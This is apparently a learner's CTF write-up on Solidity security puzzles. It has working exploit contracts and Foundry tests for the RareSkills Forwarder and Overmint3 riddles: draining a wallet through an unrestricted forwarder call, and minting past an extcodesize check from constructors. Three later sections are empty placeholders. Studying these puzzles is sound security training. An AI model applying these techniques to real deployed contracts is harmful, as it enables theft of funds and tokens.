# CTF Write Ups 2

## RareSkills Solidity Riddles: Forwarder
Link: https://github.com/RareSkills/solidity-riddles/blob/main/contracts/Forwarder.sol

### Contracts
- `src/Week10-11/Forwarder.sol`
```
contract Wallet {
    address public immutable forwarder;

    constructor(address _forwarder) payable {
        require(msg.value == 1 ether);
        forwarder = _forwarder;
    }

    function sendEther(address destination, uint256 amount) public {
        require(msg.sender == forwarder, "sender must be forwarder contract");
        (bool success,) = destination.call{value: amount}("");
        require(success, "failed");
    }
}

contract Forwarder {
    function functionCall(address a, bytes calldata data) public {
        (bool success,) = a.call(data);
        require(success, "forward failed");
    }
}
```
- `test/Week10-11/Forwarder.t.sol`
```
contract ForwarderTest is Test {
    address attackerWallet;
    uint256 attackerWalletBalanceBefore;
    Forwarder forwarderContract;
    Wallet walletContract;

    function setUp() public {
        attackerWallet = address(0xdead);
        forwarderContract = new Forwarder();
        walletContract = (new Wallet){value: 1 ether}(address(forwarderContract));
        attackerWalletBalanceBefore = attackerWallet.balance;
    }

    function testExploit() public {
        bytes memory data = abi.encodeWithSignature("sendEther(address,uint256)", attackerWallet, 1 ether);
        forwarderContract.functionCall(address(walletContract), data);

        _checkSolved();
    }

    function _checkSolved() internal {
        uint256 attackerWalletBalanceAfter = attackerWallet.balance;
        assertApproxEqAbs(
            attackerWalletBalanceAfter - attackerWalletBalanceBefore,
            1 ether,
            1000000000000000 //delta = 0.001
        );
        uint256 walletContractBalance = address(walletContract).balance;
        assertEq(walletContractBalance, 0);
    }
}
```

### Exploit
Cracking this exploit requires knowing how `.call` and `abi.encodeWithSignature` works. But simply, `call` is a low level function used to interact with another contract; and `abi.encodeWithSignature` is used to encode function calls including the function signature and its arguments. The latter returns a bytes array representing an encoded function call that can be used to make a call to another contract's function with the encoded arguments.

Since `sendEther` in `Wallet` can only be called by the `Forwarder`, and `functionCall` in `Forwarder` takes in an arbitrary `data` input which is passed to `call`, we can easily get the `Wallet` contract to send its balance to the attackers wallet by passing in the following as `data``:
```
    bytes memory data = abi.encodeWithSignature("sendEther(address,uint256)", attackerWallet, 1 ether);
    forwarderContract.functionCall(address(walletContract), data);
```
The first line constructs the encoded `sendEther` function call with the attacker's wallet as the destination and 1 ether as the amount to send. When this is passed to `functionCall`, the `Forwarder` contract sends a call to `walletContract` to execute the encoded function call. Thus transfering out the balance to the attacker.

## RareSkills Solidity Riddles: Overmint3
Link: https://github.com/RareSkills/solidity-riddles/blob/main/contracts/Overmint3.sol

### Contracts
- `src/Week10-11/Overmint3.sol`
```
contract Overmint3 is ERC721 {
    using Address for address;

    mapping(address => uint256) public amountMinted;
    uint256 public totalSupply;

    constructor() ERC721("Overmint3", "AT") {}

    function mint() external {
        require(!isContract(msg.sender), "no contracts");
        require(amountMinted[msg.sender] < 1, "only 1 NFT");
        totalSupply++;
        _safeMint(msg.sender, totalSupply);
        amountMinted[msg.sender]++;
    }

    //`isContract()` has been removed from OpenZeppelin's `Address` library in V5
    function isContract(address _addr) public view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(_addr)
        }
        return size > 0;
    }
}

contract Exploit {
    Overmint3 public overmint3Contract;
    address public attackerWallet;

    constructor(Overmint3 _overmint3Contract, address _attackerWallet) {
        overmint3Contract = _overmint3Contract;
        attackerWallet = _attackerWallet;
        new ExploitMedium(overmint3Contract, this);
        new ExploitMedium(overmint3Contract, this);
        new ExploitMedium(overmint3Contract, this);
        new ExploitMedium(overmint3Contract, this);
        new ExploitMedium(overmint3Contract, this);
    }

    function retrieve() public payable {
        uint256 balance = overmint3Contract.totalSupply();
        for (uint256 i = 1; i <= balance; i++) {
            overmint3Contract.transferFrom(address(this), attackerWallet, i);
        }
    }
}

contract ExploitMedium {
    Overmint3 public overmint3Contract;
    Exploit public exploitContract;

    constructor(Overmint3 _overmint3Contract, Exploit _exploitContract) {
        overmint3Contract = _overmint3Contract;
        exploitContract = _exploitContract;
        overmint3Contract.mint();
        uint256 tokenId = overmint3Contract.totalSupply();
        overmint3Contract.transferFrom(address(this), address(exploitContract), tokenId);
    }
}
```
- `test/Week10-11/Overmint3.t.sol`
```
contract Overmint3Test is Test {
    Overmint3 overmint3Contract;
    address attackerWallet;
    Exploit exploitContract;

    function setUp() public {
        overmint3Contract = new Overmint3();
        attackerWallet = address(0xbad);
        exploitContract = new Exploit(overmint3Contract, attackerWallet);
    }

    function testExploit() public {
        vm.startPrank(attackerWallet);
        exploitContract.retrieve();
        vm.stopPrank();
        _checkSolved();
    }

    function _checkSolved() internal {
        assertEq(overmint3Contract.balanceOf(attackerWallet), 5);
        assertTrue(vm.getNonce(address(attackerWallet)) <= 1, "must exploit in one transaction");
    }
}
```

### Exploit
The exploit requires understanding that when a function call is made from the constructor of a contract, `extcodesize` of the msg.sender will be `0` since the contract code is only stored at the end of the constructor execution. So this will bypass the `isContract` check in the `mint` function when its called from another contract's constructor.

One might be tempted to use the `onERC721Received` hook in `IERC721Receiver` to try to reenter the mint function to continuously mint NFTs in a single call, but this attack vector will fail. The reason is because if our attack was initiated in the constructor, then there will be no `onERC721Received` hook in the attacking contract available to be called yet since the constructor has not competed its execution. This would only allow 1 NFT to be minted to the attacking contract.

Instead, we could deploy 5 secondary attack contracts that solely exists to call `mint` once in each of their constructors, and then transfer the minted NFT to the primary attacking contract (or to `attackerWallet` for the matter). The primary attacking contract only needs to create 5 instances of the secondary attaking contract in its constructor, and these secondary attacking contracts will then mint and transfer an NFT to the primary contract within their constructor. At the end of the contract deployments, `attackerWallet` just has to call `retrieve` on `Exploit` to transfer out all minted NFTs.

## RareSkills Solidity Riddles: Democracy
Link: https://github.com/RareSkills/solidity-riddles/blob/main/contracts/Democracy.sol

### Contracts
- `src/Week10-11/Democracy.sol`
```
```
- `test/Week10-11/Democracy.t.sol`
```
```

### Exploit

## Damn Vulnerable DeFi (Foundry): Truster
Link: https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v3.0.0/contracts/truster

### Contracts
- `src/Week10-11/TrusterLenderPool.sol`
```
```
- `test/Week10-11/TrusterLenderPool.t.sol`
```
```

### Exploit

## Ethernaut: #13 Gatekeeper 1
Link: https://ethernaut.openzeppelin.com/level/0xb5858B8EDE0030e46C0Ac1aaAedea8Fb71EF423C

### Contracts
- `src/Week10-11/GateKeeperOne.sol`
```
```
- `test/Weel10-11/GateKeeperOne.t.sol`
```
```

### Exploit